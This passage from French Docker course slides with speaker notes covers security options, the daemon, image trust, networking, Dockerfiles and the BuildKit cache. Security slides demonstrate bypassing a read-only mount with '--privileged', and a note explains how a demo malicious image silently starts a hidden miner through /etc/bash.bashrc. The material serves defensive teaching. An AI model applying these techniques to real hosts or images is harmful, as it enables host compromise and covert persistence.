      - Ils s'ajoutent aux namespaces et aux capabilities : si un verrou saute, les autres tiennent
    ],
    bloc(role: "pratique")[Vérifier qu'ils sont là][
      #terminal(taille: px(16))[
  ```
  $ docker info | grep -A3 'Security Options'
   Security Options:
    apparmor
    seccomp
     Profile: builtin
  ```
      ]
    ],
  ),
  note(role: "danger")[La règle : ne pas y toucher. `--privileged` retire les deux et donne toutes les capabilities.],
  note: _note,
)

== Piège : un montage en lecture seule
#let _note = [Sorties réelles (docker.io 26.1.5 de Debian 13) : sans --privileged, remontage refusé ; avec, le fichier x apparaît dans /srv/data de l’hôte. Verrouillage en user namespace reproduit avec unshare.]
#anime(
  rang(
    bloc(role: "pratique")[Par défaut][
      #terminal(taille: px(15))[
  ```
  $ docker container run -it \
    -v /srv/data:/data:ro debian
  # touch /data/x
  Read-only file system
  # mount -o remount,bind,rw /data
  mount: /data: permission denied
  ```
      ]
    ],
    bloc(role: "danger")[Avec `--privileged`][
      #terminal(taille: px(15))[
  ```
  $ docker container run -it --privileged \
    -v /srv/data:/data:ro debian
  # mount -o remount,bind,rw /data
  # touch /data/x        # réussit
  ```
      ]
    ],
  ),
  note(role: "precaution")[« :ro » tient tant que le conteneur n'a pas `CAP_SYS_ADMIN` ; `--privileged` la donne. En user namespace, les montages hérités sont verrouillés en lecture seule.],
  note: _note,
)

== Le démon Docker
#let _note = none
#anime(
  rang(
    bloc(role: "danger")[Surface d'attaque][
      - Le démon Docker s'exécute en *root*
      - Seul un administrateur devrait pouvoir le contrôler (*groupe `docker` = root de fait*)
      - Mode *rootless* (depuis la 20.10) : démon et conteneurs sans privilèges root, dans un user namespace (paquet `uidmap`)
    ],
    bloc(role: "precaution")[En production][
      - Sur un serveur Docker, rien d'autre que les services de base (ssh, dhcp…)
      - Pas de tests de conteneurs sur une machine de production
      - Quelle confiance accorder à l'image téléchargée ? (diapositive suivante)
    ],
  ),
  note: _note,
)

== Quelle confiance accorder à une image ?
#let _note = [Cas réel : en juin 2018, Kromtech détaille 17 images Docker Hub publiées par un même compte (docker123321), signalées auparavant par Fortinet : 9 embarquaient un mineur de Monero, les autres laissaient un accès à l’attaquant ; environ 5 millions de téléchargements sur l’année de présence, 544,74 XMR minés (environ 90 000 \$) ; retrait par Docker le 10 mai 2018. Sources : threatpost.com (« Malicious Docker Containers Earn Cryptomining Criminals \$90K », 13/06/2018), theregister.com (14/06/2018). Terminal : sortie réelle (docker.io 26.1.5 de Debian 13, le 17 novembre 2026) sur une image d’exemple inoffensive construite pour le cours : FROM debian:13, un RUN echo qui ajoute une ligne à /etc/bash.bashrc, CMD \["bash"\] ; le binaire et le domaine n’existent pas. Ordre d’affichage : docker image history liste les couches de la plus récente à la plus ancienne ; dans le Dockerfile, le RUN vient donc avant le CMD. Le RUN n’exécute pas le mineur pendant le build : il écrit une ligne dans un fichier de démarrage. Ce que voit l’utilisateur : rien. CMD \["bash"\] lui donne un shell ; ce bash interactif lit /etc/bash.bashrc et lance la ligne ajoutée, en arrière-plan et sans sortie. Reproduit avec un programme témoin à la place du mineur : docker container run -it affiche seulement l’invite, et le témoin a bien été exécuté. Les parenthèses lancent la commande dans un sous-shell, ce qui évite le message « \[1\]+ Done » de bash. Erreur corrigée par rapport à la version précédente de la diapositive : /etc/profile.d n’est lu que par les shells de connexion, pas par le bash lancé par CMD (: rien ne s’exécutait). Limite : docker image history ne montre pas le contenu des fichiers copiés par COPY/ADD ; d’où le scanner et la lecture du Dockerfile source. Les scanners cités ne sont pas dans les paquets Debian 13 : à installer à part. /usr/lib/.cache : binaire au nom banal et caché ; « pool » : serveur qui coordonne le minage (port 3333 typique). Indices à repérer : fichier caché dans un répertoire système, adresse réseau en dur, lancement automatique. Docker Scout fait aussi partie des scanners possibles. Socket Docker : il permet de piloter le démon, donc d’être root sur l’hôte. Renvoi : épingler par digest (diapositive « Tag ou digest »), socket Docker (diapositive Compose).]
#anime(
  rang(
    bloc(role: "danger")[Cas réel : Docker Hub, 2018][
      - 17 images d'un même compte, présentées comme des outils (Tomcat, MySQL, cron)
      - Dedans : un mineur de Monero ou une porte dérobée
      - ~5 millions de téléchargements en un an, 90 000 \$ minés ; retirées en mai 2018
      - `docker container run` exécute le programme d'un inconnu, avec les droits que vous lui donnez
    ],
    bloc(role: "retenir")[Avant de lancer une image inconnue][
      - *Origine* : image officielle, éditeur vérifié, ou Dockerfile publié
      - *Contenu* : `docker image history --no-trunc` montre chaque étape du build
      - *Version figée* : tag précis ou digest, jamais `latest`
      - *Analyse* : scanner d'images (Trivy, Grype)
    ],
  ),
  note: _note,
)

== Si Docker fonctionne dans ...
#let _note = [Stack \= un projet Compose (vu plus loin) : un ensemble de conteneurs qui forment une application. Escalade de privilèges : depuis le conteneur, obtenir les droits de l’hôte (on parle aussi d’« évasion » du conteneur). Idée de la diapositive : tous les pièges de la section (root partagé, groupe docker, socket, --privileged) ont pour enjeu « ce qu’atteint celui qui sort du conteneur ». La VM déplace cette frontière : la sortie d’un conteneur mène dans la VM, pas sur le serveur. Hôte physique dédié : sur le plan de l’isolation, équivaut à une VM unique, mais sans snapshot ni reconstruction rapide. Une VM pour toutes les stacks : protège l’hyperviseur et les autres VM, pas les stacks entre elles. Une VM par stack : le seul cas où l’on peut assouplir (root dans le conteneur, socket monté pour Traefik), au prix de N systèmes à mettre à jour ; c’est ce que font, en plus léger, les microVM (Kata Containers, Firecracker : cours Virtualisation). Limites : une évasion de VM existe mais reste rare ; la VM ne protège ni des images malveillantes ni des services exposés. Nuance sur « Réparer » : restaurer un snapshot ramène toute la VM à son état figé, y compris les données écrites depuis (volumes compris) ; dans la VM partagée, tous les services reculent ensemble, d’où l’intérêt d’une VM par service si l’on veut pouvoir en restaurer un seul. Un snapshot n’est donc pas une sauvegarde incrémentale : les données à conserver vivent sur un stockage à part (volume, base, sauvegarde) et ne sont pas remontées par un rollback. Diapositive de synthèse, sans commande : rien à rejouer.]
#anime(
  rang(
    bloc[Hôte physique dédié][
      - Une escalade atteint *la machine, toutes les stacks*
      - Réparer : réinstaller
      - Coût : le plus faible
    ],
    bloc(role: "precaution")[Une VM pour tous les conteneurs][
      - Une escalade atteint *la VM, toutes les stacks*
      - Réparer : snapshot, mais tous les services reculent
      - Coût : un système de plus
    ],
    bloc(role: "pratique")[Une VM par service][
      - Une escalade atteint *une seule stack*
      - Réparer : snapshot du seul service touché
      - Coût : un système par stack à maintenir
    ],
  ),
  note(role: "precaution")[*Stack* = les conteneurs d'une même application, décrits ensemble dans un projet Docker Compose (vu plus loin). Dans une VM dédiée, « root du conteneur = root de l'hôte » ne concerne plus que cette VM.],
  note: _note,
)

= Bases · Réseau

== Réseau : le bridge par défaut
#let _note = [Vocabulaire : bridge \= pont \= switch virtuel, trois noms pour le même objet ; on garde « bridge », le terme de Docker (docker network ls, --network bridge). Code couleur : chaque mode a la couleur de l’élément du schéma qu’il utilise (bleu \= docker0 pour bridge, ardoise \= eth0 de l’hôte pour host) ; flèches neutres. Chaque conteneur reçoit une paire veth : un bout dans son namespace (eth0), l’autre branché sur docker0. Sur docker.io 26.1.5 : docker network ls liste bridge, host, none ; docker network create tstnet crée l’interface br-b7381d8c14eb (12 premiers caractères de l’ID) et le sous-réseau 172.19.0.0/16 (172.18 était déjà pris).]
#anime(
  rang(
    bloc[`bridge` (défaut)][
      - Chaque conteneur a son namespace réseau et une paire `veth` reliée à `docker0`
      - `docker0` : `172.17.0.1`, passerelle des conteneurs
      - Sortie : NAT ; entrée : `-p` (DNAT)
    ],
    bloc(role: "precaution")[`host`][
      - Partage l'`eth0` de l'hôte : aucune isolation réseau, pas de `-p`
    ],
    bloc[`none`][
      - Seule l'interface `lo`
      - Vos réseaux : `docker network create` — chacun son bridge et son sous-réseau, avec *DNS par nom* (diapositive suivante)
    ],
  ),
  note: _note,
)

== Rappel : comment marche le mode bridge
#let _note = [Rappel du schéma de la diapositive précédente, mécanisme par mécanisme ; le petit schéma correspond exactement à l’exemple du terminal. Le bridge travaille au niveau 2 (adresses MAC) : entre A et B, le paquet traverse docker0 sans passer par le NAT (ping de ctA vers 172.17.0.3 : réponse directe, ttl\=64). Vers Internet, l’hôte route (ip\_forward) puis remplace l’IP source par la sienne (règle MASQUERADE). Dans l’autre sens, -p ajoute une règle DNAT : ce qui arrive sur le port 8080 de l’hôte est réécrit vers 172.17.0.3:80 (curl localhost:8080 depuis l’hôte répond « bonjour »). Sorties réelles, docker.io 26.1.5 de Debian 13 ; ctB est un petit serveur nc lancé avec -p 8080:80. Schéma : quel veth pour quel conteneur ? docker container exec ctA cat /sys/class/net/eth0/iflink donne 7, l’ifindex de veth642b1a4 (cat /sys/class/net/veth642b1a4/ifindex) ; pour ctB, 9 \= vethacfb809. Noms des veth : « veth » + 7 caractères hexadécimaux tirés au hasard (crypto/rand) par Docker à la création, sans lien avec l’ID du conteneur ; les deux bouts naissent ainsi, puis le bout côté conteneur est renommé eth0 et déplacé dans son namespace réseau (source moby v26.1.5 : libnetwork/drivers/bridge, vethLen \= len("veth") + 7 ; netutils.GenerateRandomName). Règles iptables, lues de gauche à droite : -A POSTROUTING \= ajouter à la chaîne traversée par les paquets qui quittent l’hôte ; -s 172.17.0.0/16 \= venant d’un conteneur ; ! -o docker0 \= ne ressortant pas par docker0 (donc pas vers un autre conteneur) ; -j MASQUERADE \= remplacer l’IP source par celle de l’interface de sortie. -A DOCKER \= chaîne de Docker, appelée à l’arrivée des paquets ; ! -i docker0 \= pas venu d’un conteneur ; -p tcp --dport 8080 \= TCP vers le port 8080 ; -j DNAT --to-destination 172.17.0.3:80 \= réécrire la destination. MASQUERADE dans POSTROUTING (après la décision de routage) ne touche que ce qui sort du réseau des conteneurs vers l’extérieur ; ! -o docker0 exclut le trafic entre conteneurs. DNAT dans la chaîne DOCKER (appelée depuis PREROUTING pour les adresses locales de l’hôte) ; ! -i docker0 : ne s’applique pas aux paquets venant des conteneurs eux-mêmes. Sans la commande ip sur l’hôte, /sys/class/net/docker0/brif liste les ports du bridge ; avec iproute2 : ip link show master docker0 ou bridge link.]
#anime(
  rang(
    bloc[Le bridge et les câbles][
      - `docker0` : bridge (switch virtuel) du noyau ; son IP `172.17.0.1` = passerelle des conteneurs
      - Par conteneur, une paire `veth` (câble virtuel) : `eth0` chez lui, `veth…` sur `docker0`
      - *Entre conteneurs* (même bridge) : trafic direct, par IP seulement — *pas de DNS* sur le bridge par défaut
      - *Sortie* : routage puis NAT (MASQUERADE) ; *entrée* : `-p 8080:80` = DNAT
    ],
    bloc(role: "pratique")[Terminal (hôte)][
      #terminal(taille: px(15))[
  ```
  $ docker container exec ctA ip route
  default via 172.17.0.1 dev eth0
  172.17.0.0/16 dev eth0 src 172.17.0.2
  ```
      ]
    ],
  ),
  note: _note,
)

== Réseaux utilisateur et DNS
#let _note = [Sorties réelles (docker.io 26.1.5 de Debian 13). DNS intégré à l’adresse 127.0.0.11. Docker écrit ses propres règles iptables/nftables, d’où le contournement d’UFW.]
#anime(
  rang(
    bloc(role: "pratique", poids: 1.3)[Terminal][
      #terminal(taille: px(15))[
  ```
  $ docker network create app
  $ docker container run -d --network app --name web nginx
  $ docker container run --rm --network app alpine nslookup web
  Name: web
  Address: 172.18.0.2
  $ docker container run --rm alpine wget -qO- web   # bridge défaut
  wget: bad address 'web'
  ```
      ]
    ],
    bloc(role: "retenir")[À retenir][
      - *Réseau utilisateur* : DNS intégré, les conteneurs se joignent par leur *nom*
      - *Bridge par défaut* : pas de résolution de noms
    ],
  ),
  note: _note,
)

= Bases

== Conteneurs graphiques
#let _note = [Le socket Wayland appartient à l’utilisateur de l’hôte : le conteneur doit tourner avec le même UID (--user). Partager le socket X11 donne au conteneur l’accès à tout l’affichage (frappes clavier comprises) : VNC isole mieux.]
#anime(
  rang(
    bloc[C'est possible, mais hors de l'objet du cours][
      - *Xorg* : partager `/tmp/.X11-unix` et `~/.Xauthority` de l'hôte
      - *Wayland* : partager le socket `$XDG_RUNTIME_DIR/$WAYLAND_DISPLAY` ; les applis X11 passent par XWayland
      - *VNC* : moins efficace, mais plus sécurisé
    ],
    bloc(role: "pratique")[Exemple Wayland][
      #terminal(taille: px(15))[
  ```
  $ docker container run -it --user $(id -u) \
    -e WAYLAND_DISPLAY \
    -e XDG_RUNTIME_DIR=/tmp \
    -v $XDG_RUNTIME_DIR/$WAYLAND_DISPLAY:\
  /tmp/$WAYLAND_DISPLAY \
    mon_image_graphique
  ```
      ]
    ],
  ),
  note: _note,
)

= Utilisation avancée

== Création d’images : méthode naïve
#let _note = [Sortie réelle (docker.io 26.1.5 de Debian 13).]

#anime(
  rang(
    bloc[Cas d'usage][
      - Usage pédagogique
      - Environnement qui ne se configure qu'en mode graphique (Eclipse, par exemple)
      - Débogage d'une construction automatisée (`docker image build`)
    ],
    bloc(role: "pratique")[`docker container commit`][
      #terminal(taille: px(15))[
```
$ docker container run -it --name avant debian bash
# echo "hello world !" > /nouveau.txt
# exit
$ docker container commit avant image_apres
sha256:b984186c480d…
$ docker container run --rm image_apres cat /nouveau.txt
hello world !
```
      ]
    ],
  ),
  note: _note,
)


== Méthode naïve : à vous
#let _note = none
#anime(
  rang(
    bloc(role: "question")[À vous][
      + Faire une image « mon_image » à partir d'une `debian` 13
      + Elle contiendra le paquet `inetutils-ping` (`ping` n'est pas installé par défaut)
      + Tester : `docker container run mon_image ping localhost`
    ],
  ),
  note: _note,
)

== La méthode efficace : Dockerfile
#let _note = none

#anime(
  rang(bloc[Dockerfile][
    - Un fichier texte : les étapes qu'on ferait à la main (paquets, fichiers, utilisateurs, variables)
    - `docker image build` le lit et construit l'image
    - `FROM`, `RUN`, `COPY`, `ADD` : une couche de fichiers chacune
    - Les autres instructions : 0 B (métadonnées ; `WORKDIR` crée au plus un répertoire vide)
    - Un Dockerfile par image ; plusieurs étapes possibles (multi-stage, plus loin)
  ]),
  note: _note,
)


== Dockerfile : contexte et instructions
#let _note = [Cours d’origine : « Il est possible d’utiliser des variables interprétables par certaines instructions dans un Dockerfile. Ces variables sont des variables d’environnement (comme HOME, PATH…) ». Liste officielle (Dockerfile reference, section Environment replacement, moby/buildkit, consultée le 16/11/2026) : ADD, COPY, ENV, EXPOSE, FROM, LABEL, STOPSIGNAL, USER, VOLUME, WORKDIR, ONBUILD (combiné à l’une d’elles) ; RUN, CMD, ENTRYPOINT : substitution par le shell, pas par le builder, et rien en forme exec. Sur 26.1.5 (BuildKit) : ENV D\=/app puis WORKDIR \${D} → /app ; RUN echo "\$D" → /app ; RUN \["echo", "\$D"\] → \$D (l’affichage de la progression montre /app, trompeur). Nuance HOME/PATH : PATH est connu au build car l’image debian le déclare (ENV) ; HOME ne l’est pas (LABEL h\="\[\${HOME}\]" donne « \[\] ») : il n’est posé qu’à l’exécution.]
#anime(
  rang(
    bloc[Contexte de build][
      - Un répertoire *dédié* par image : tout son contenu est le *contexte* du build
      - Jamais de Dockerfile à la racine du système : le contexte serait tout le disque
      - `.dockerignore` exclut du contexte, comme pour git
      - Commentaires préfixés par `#`
    ],
    bloc[Les instructions][
      `FROM` `RUN` `CMD` `LABEL` `EXPOSE` `ENV` `ADD` `COPY` `ENTRYPOINT` `VOLUME` `USER` `WORKDIR` `ARG` `ONBUILD` `STOPSIGNAL` `HEALTHCHECK` `SHELL`
  
      Chaque instruction a son rôle, détaillé au fil du cours. Certaines remplacent les variables `${VAR}` (diapositive suivante).
    ],
  ),
  note: _note,
)

== Variables dans un Dockerfile : qui les remplace ?
#let _note = [Diapositive recentrée sur une seule question : qui remplace les variables. Expression graphique demandée : le Dockerfile est envoyé au builder tel quel (les \${…} restent dans le fichier) ; BuildKit les remplace en lisant chaque instruction. Le bloc « résolu ligne par ligne » n’est donc pas un fichier qui existe quelque part, mais ce que chaque instruction reçoit. La réponse, le builder (BuildKit), pour les instructions de configuration. Sur docker.io 26.1.5 : ENV APP\_DIR\=/app puis WORKDIR \${APP\_DIR} donne un conteneur dont pwd vaut /app ; LABEL p\="\${PATH}" h\="\[\${HOME}\]" donne p rempli (PATH est déclaré par l’image debian:13, ENV dans sa configuration) et h vide (HOME n’existe qu’à l’exécution). Les variables interprétées sont celles déclarées par ENV ou ARG, pas l’environnement de l’hôte. Liste officielle des instructions concernées (Dockerfile reference, Environment replacement) : ADD, COPY, ENV, EXPOSE, FROM, LABEL, STOPSIGNAL, USER, VOLUME, WORKDIR, ONBUILD. RUN, CMD, ENTRYPOINT : la substitution revient au shell, et seulement en forme shell — traité avec CMD et ENTRYPOINT, pour ne pas mêler ici la notion de forme exec/shell.]

#anime(
  rang(
    bloc[Dockerfile — envoyé au builder tel quel][
      #terminal(titre: none, taille: px(18))[```
FROM debian:13
ENV APP_DIR=/app
WORKDIR ${APP_DIR}
LABEL p="${PATH}" h="[${HOME}]"
```]
      *1.* Dans quel répertoire l'image travaille-t-elle ?\
      *2.* Que contiennent les labels `p` et `h` ?
    ],
    bloc(role: "pratique")[BuildKit résout ligne par ligne][
      - `WORKDIR ${APP_DIR}` → `WORKDIR /app`
      - `p="${PATH}"` → `"/usr/local/sbin:…:/bin"`
      - `h="[${HOME}]"` → `"[]"` (vide : `HOME` n'existe qu'à l'exécution)
    ],
  ),
  note(role: "retenir")[Le builder remplace `${VAR}` dans les instructions de configuration (ENV, WORKDIR, LABEL…), à partir des `ENV`/`ARG` déjà vus. `$HOME`, lui, est une variable d'exécution : vide au build.],
  note: _note,
)


== Fil rouge : un service qui dit son nom
#let _note = [Aucune ligne de code applicatif : tout est configuration et conteneurisation. Le hostname d’un conteneur est son identifiant court, ce qui rend la répartition de charge visible. Traefik lit les étiquettes (labels) des conteneurs pour se configurer.]

#anime(
  rang(bloc(role: "retenir")[Le fil rouge : le service « hello »][
    - *Dockerfile* : l'image `hello`, un nginx qui répond « Bonjour depuis <hostname> »
    - `docker image build`, `docker container run`, cache de build
    - *Compose* : `hello` derrière Traefik (un proxy qui découvre les conteneurs et répartit la charge)
    - *Passage à l'échelle à chaud* : `--scale hello=5`
  ]),
  note: _note,
)


== Le Dockerfile de hello
#let _note = [Apparition progressive, une instruction par clic en mode Présentation. \$hostname est une variable de nginx : le hostname du conteneur, c’est-à-dire son identifiant court. Construit : docker image build -t hello. puis docker container run -d -p 8080:80 hello ; curl localhost:8080 répond « Bonjour depuis bad5b4271768 » ; docker container ls affiche (healthy) après le premier test. HEALTHCHECK est volontairement laissé sans explication détaillée à ce stade : c’est une métadonnée (0B dans docker image history, diapositives suivantes), et le conteneur passe à l’état healthy/unhealthy selon le test, ce que Traefik et Compose peuvent attendre. Intervalle de 5 s (30 s par défaut) pour que Traefik prenne vite les nouvelles instances en compte. Une diapositive dédiée pourrait détailler les états et l’option --health-cmd si on veut en faire une notion à part entière.]
#anime(
  rang(
    bloc[`hello.conf`][
      #terminal(titre: none, taille: px(17))[```
  server {
    listen 80;
    default_type text/plain;
    location / {
      return 200 "Bonjour depuis $hostname\n";
    }
  }
  ```]
    ],
    bloc[`Dockerfile`][
      #terminal(titre: none, taille: px(16))[```
  FROM nginx:1.29-alpine
  COPY hello.conf /etc/nginx/conf.d/default.conf
  EXPOSE 80
  HEALTHCHECK --interval=5s \
    CMD wget -qO- http://localhost/ || exit 1
  ```]
      `FROM` l'image de base, `COPY` la config (une couche), `EXPOSE` documente, `HEALTHCHECK` = test de santé (utile à Traefik).
    ],
  ),
  note: _note,
)

== Avant 2023 : le builder classique
#let _note = [Le même Dockerfile de hello, construit avec l’ancien builder : DOCKER\_BUILDKIT\=0 docker image build -t hello-legacy. sur docker.io 26.1.5 de Debian 13 ; identifiants réels. Sortie : Step 1/4 FROM → 812d47f806db ; Step 2/4 COPY → f93a19979748 (pas de conteneur) ; Step 3/4 EXPOSE → Running in 19e1c76b1841, Removed intermediate container, → 54654138511a ; Step 4/4 HEALTHCHECK → Running in 656a569799c7 → 1f62133b381d. docker image ls -a montre ensuite f93a19979748 et 54654138511a en \<none\>. Clics : une instruction par clic, puis le bilan, puis les dates. Sources : notes de version Docker Engine 23.0 (« Set Buildx and BuildKit as the default builder on Linux », 2023-02-01) ; BuildKit arrive dans Docker 18.09 (T. Tiigi, « Build secrets and SSH forwarding in Docker 18.09 »). L’ancien builder sert encore pour les conteneurs Windows.]
#anime(
  rang(
    bloc[Le builder classique (avant 2023)][
      - Une instruction après l'autre, dans l'ordre du fichier
      - Chaque instruction laisse une *image intermédiaire* (`<none>`)
      - Même `EXPOSE` passe par un conteneur temporaire, démarré puis supprimé
      - Lent et verbeux ; remplacé par BuildKit (diapositives suivantes)
    ],
    bloc(role: "pratique")[Les images intermédiaires][
      #terminal(taille: px(15))[
  ```
  FROM nginx:1.29-alpine   812d47f806db
  COPY hello.conf …        f93a19979748
  EXPOSE 80                19e1c76b1841
  HEALTHCHECK …            656a569799c7
                   hello   1f62133b381d
  ```
      ]
    ],
  ),
  note: _note,
)

== BuildKit : du Dockerfile à l’image
#let _note = [Un clic par composant. Le Dockerfile n’est qu’un format d’entrée : le frontend le traduit en LLB, le format interne de BuildKit (doc Docker, « BuildKit » : « A frontend is a component that takes a human-readable build format and converts it to LLB so BuildKit can execute it »). Le solveur ne travaille que sur ce graphe : il saute les étapes dont la clé est en cache, exécute en parallèle ce qui est indépendant, ignore ce dont l’image finale ne dépend pas (« Detect and skip executing unused build stages », « Parallelize building independent build stages »). Pour hello, le graphe est une chaîne : nginx et le contexte, puis COPY. Les branches parallèles se verront avec le multi-stage. Plusieurs FROM : rien de déprécié, mais depuis Docker 17.05 (mai 2017) chaque FROM ouvre une étape de build, c’est le multi-stage (référence Dockerfile : « FROM can appear multiple times within a single Dockerfile to create multiple images or use one build stage as a dependency for another » ; « Each FROM instruction clears any state created by previous instructions »). L’ancien usage, plusieurs images indépendantes dans un même Dockerfile, ne marche plus vraiment avec BuildKit : seule la dernière étape (ou celle de --target) est construite et exportée, les autres sont sautées si elle n’en dépend pas. Pour plusieurs images : un build par cible (--target), ou docker buildx bake.]
#anime(
  rang(
    bloc[1 · Frontend Dockerfile][
      - Lit le Dockerfile et le traduit en *graphe LLB* (_Low-Level Build_) : des étapes et leurs dépendances
      - `EXPOSE`, `HEALTHCHECK` : rien à exécuter, ils vont dans la configuration de l'image
    ],
    bloc[2 · Graphe LLB][
      - Les étapes et ce dont elles dépendent (image de base, contexte)
      - Chaque `FROM` ouvre une étape : plusieurs `FROM` = build multi-stage (plus loin)
    ],
    bloc(role: "pratique")[3 · Solveur][
      - Parcourt le graphe ; exécute chaque étape dont les dépendances sont prêtes
      - Réutilise le cache quand la clé n'a pas changé (diapositives suivantes)
    ],
  ),
  note: _note,
)

== BuildKit : une étape, pas à pas
#let _note = [L’étape COPY du Dockerfile de hello (ligne surlignée). Un clic par phase : le schéma (à gauche) et le texte (à droite) avancent ensemble ; 6e clic, ce que la clé change au build suivant, démontré en réel plus loin (touch, chmod et modification de hello.conf). La clé est montrée par ses ingrédients ; la vraie clé est une empreinte (hash) calculée par BuildKit. 127 octets : taille de hello.conf, celle qu’affiche docker image history pour cette couche. Lecture de bas en haut, comme l’empilement : chaque étape (droite) est au niveau de l’élément qu’elle produit (gauche). Pour un RUN, même chemin, mais la commande tourne dans un conteneur éphémère lancé par BuildKit, pas par dockerd : après deux builds, docker container ls -a est vide (sur docker.io 26.1.5 de Debian 13).]
#anime(
  rang(
    bloc[Une étape COPY, pas à pas][
      - *État parent* : les couches de `nginx:1.29-alpine` (lecture seule) + une couche vide en écriture
      - `hello.conf` (contexte) → `/etc/nginx/conf.d/default.conf`
      - *Nouvelle couche* : `default.conf` (127 octets) — le _diff_, celui que `docker image history` affichera
    ],
    bloc(role: "retenir")[La clé de l'étape][
      - *clé* = empreinte de : clé du parent (nginx) + l'instruction « COPY hello.conf … » + `hello.conf` (contenu, droits)
      - *cache de build* : clé → couche
    ],
  ),
  note: _note,
)

== De l’instruction à la couche : docker image build
#let _note = [Le Dockerfile reste visible au-dessus de la sortie. Sortie complète, telle que l’affiche un terminal (mode par défaut de BuildKit), docker.io 26.1.5 et docker-buildx 0.13.1 de Debian 13, terminal de 80 colonnes : les lignes longues y sont coupées, l’ID d’image aussi. nginx:1.29-alpine est déjà présent (utilisé dans la partie Volumes) ; sinon, l’étape FROM affiche en plus une vingtaine de lignes de téléchargement. Seules FROM et COPY sont des étapes \[n/2\] : EXPOSE et HEALTHCHECK ne font que compléter la configuration de l’image. En vrai, BuildKit colore les étapes en bleu ; ici, un liseré de couleur par groupe, expliqué clic par clic à droite, chaque explication au niveau des lignes qu’elle commente. Animation automatique à l’arrivée de la diapositive, fidèle à l’enregistrement brut du terminal (build du 19/11, 16 h 38) : BuildKit n’a dessiné que deux états, « \[+\] Building 0.0s (0/1) » seul, puis l’état final ; le build a duré 0,1 s, l’animation l’étire à environ une seconde. Ensuite, un clic par explication.]
#anime(
  rang(
    bloc(role: "pratique", poids: 1.3)[Terminal][
      #terminal(taille: px(14))[
  ```
  $ docker image build -t hello .
  [+] Building 0.1s (7/7) FINISHED            docker:default
   => [internal] load build definition from Dockerfile
   => => transferring dockerfile: 187B
   => [internal] load metadata for nginx:1.29-alpine
   => [internal] load build context
   => => transferring context: 164B
   => CACHED [1/2] FROM nginx:1.29-alpine
   => [2/2] COPY hello.conf …default.conf
   => exporting to image
  ```
      ]
    ],
    bloc[Dockerfile de hello][
      #terminal(titre: none, taille: px(15))[```
  FROM nginx:1.29-alpine
  COPY hello.conf …default.conf
  EXPOSE 80
  HEALTHCHECK …
  ```]
    ],
  ),
  note: _note,
)

== De l’instruction à la couche : les couches de hello
#let _note = [Lecture de bas en haut, comme l’empilement : chaque ligne de docker image history (le plus récent en haut) est au niveau de la couche qu’elle décrit. Sortie réelle (docker.io 26.1.5 de Debian 13), head -5 visible dans la commande : 4 lignes après l’en-tête ; docker image history affiche 23 lignes en tout, dont 20 pour nginx:1.29-alpine. La ligne RUN … 49.4MB est la dernière couche de nginx. Les instructions sont en police mono, comme tout ce qui se tape ; la commande docker container run est dans un cartouche de terminal, hors de l’empilement : elle n’est pas une couche, elle crée la couche en écriture. EXPOSE et HEALTHCHECK n’ont pas de couche de fichiers (0B) : ils modifient la configuration. Clics, dans l’ordre du Dockerfile : couches de nginx, couche du COPY, EXPOSE, puis HEALTHCHECK (chacun ajoute une entrée d’historique, sans couche de fichiers), puis docker container run crée une couche en écriture au-dessus des couches de l’image, qui restent en lecture seule.]
#anime(
  rang(
    bloc(role: "pratique", poids: 1.3)[Terminal][
      #terminal(taille: px(15))[
  ```
  $ docker image history \
    --format "table {{.CreatedBy}}\t{{.Size}}" hello | head -5
  FROM nginx:1.29-alpine   (20 lignes d'historique)
  COPY hello.conf …        127B
  EXPOSE 80                0B
  HEALTHCHECK …            0B
  ```
      ]
    ],
    bloc(role: "retenir")[À retenir][
      - `FROM`, `RUN`, `COPY` : une couche de fichiers (taille)
      - `EXPOSE`, `HEALTHCHECK` : configuration, pas de fichiers (0 B)
    ],
  ),
  note: _note,
)

== Lire la sortie de BuildKit : les numéros \#N
#let _note = [Sortie réelle et complète, cache de build vidé (docker builder prune -af), docker.io 26.1.5 de Debian 13, contexte : Dockerfile et hello.conf. --progress\=plain : c’est le mode où BuildKit affiche les numéros, et celui qu’il prend quand la sortie n’est pas un terminal (redirection, CI) ; dans un terminal, les mêmes opérations s’affichent sans numéro (\=\>). Un clic par numéro, de \#0 à \#7, la sortie à droite et son explication à gauche en même temps : \#0 l’en-tête, \#1 à \#4 la préparation (aucune ligne du Dockerfile), \#5 FROM (étape \[1/2\]), \#6 COPY (étape \[2/2\]), \#7 l’export, en face de EXPOSE et HEALTHCHECK, qui n’ont pas d’opération : ils vont dans la configuration de l’image, écrite à l’export (\#7, writing image). \#N : numéro d’opération attribué par BuildKit dans l’ordre d’affichage ; \[k/n\] : étape k sur n du Dockerfile (instructions qui touchent au système de fichiers). L’identifiant d’image (ee1957e9d911…) diffère de celui de la diapositive docker image build : la date de création fait partie de la configuration, donc chaque build depuis un cache vide donne un nouvel identifiant.]
#anime(
  rang(
    bloc(role: "pratique", poids: 1.4)[Terminal][
      #terminal(taille: px(14))[
  ```
  $ docker image build --progress=plain -t hello .
  #0 building with "default" instance using docker driver
  #1 [internal] load build definition from Dockerfile
  #1 DONE 0.0s
  #2 [internal] load metadata for …nginx:1.29-alpine
  #3 [internal] load .dockerignore
  #4 [internal] load build context
  #5 [1/2] FROM …nginx:1.29-alpine
  #6 [2/2] COPY hello.conf …default.conf
  #7 exporting to image
  ```
      ]
    ],
    bloc(role: "retenir")[Lire les `#N`][
      - `#N` = numéro d'*opération*, dans l'ordre d'affichage
      - `#1`–`#4` : préparation ; `#5` : `FROM` ; `#6` : `COPY` ; `#7` : export
      - `[2/2]` : étape 2 sur 2 *du Dockerfile*
    ],
  ),
  note: _note,
)

== Le cache de BuildKit : la clé de chaque étape
#let _note = [Cinq builds réels à la suite du Dockerfile de hello (docker.io 26.1.5 de Debian 13, cache vidé au départ), un par clic ; chaque point de « À retenir » arrive avec le build qu’il explique (le dernier clic ajoute RUN et docker builder prune). Cette diapositive reprend aussi l’ancienne diapositive « Le cache de build » (fusionnée) : après le sed, la sortie complète montre CACHED \[1/2\] FROM et \[2/2\] COPY refaite, et l’ancienne image hello devient \<none\> dans docker image ls ; en remettant « Bonjour », le build suivant est entièrement CACHED et redonne la même image (même ID). Placer en dernier ce qui change souvent. Clic 2, la loupe sur le premier \#6, reliée à la ligne COPY du Dockerfile : \#6 est l’opération du COPY (sortie complète et numérotée : diapositive précédente) ; elle disparaît au clic 3, qui montre le 2e build ; seule la ligne COPY (surlignée) est concernée. Doc Docker « Build cache invalidation » : « The modification time of a file (mtime) is not taken into account when calculating the cache checksum » ; « The cache for RUN instructions isn’t invalidated automatically between builds ». Le 4e build retrouve la clé du 1er : le cache n’a pas qu’une version. Une étape 